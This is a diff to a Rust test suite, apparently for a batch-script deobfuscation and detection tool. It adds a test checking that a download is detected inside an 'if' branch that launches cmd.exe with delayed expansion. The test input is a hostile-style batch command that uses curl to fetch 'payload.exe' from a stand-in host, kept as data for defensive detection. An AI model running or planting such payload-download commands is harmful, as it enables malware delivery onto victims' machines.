@@ -8951,7 +8951,7 @@ mod child_tests {
 
 #[cfg(test)]
 mod if_tests {
-    use crate::{analyze, Config};
+    use crate::{analyze, Config, Trait};
 
     #[test]
     fn if_defined_runs_body() {
@@ -8972,6 +8972,23 @@ mod if_tests {
             report.deobfuscated.contains("echo match"),
             "got:\n{}",
             report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn if_cmd_child_preserves_delayed_expansion() {
+        let script = br#"if "a"=="a" cmd.exe /V:ON /c "set U=https://if-wrapper.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://if-wrapper.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "if cmd child did not preserve delayed expansion: {:?}",
+            report.traits
         );
     }
 
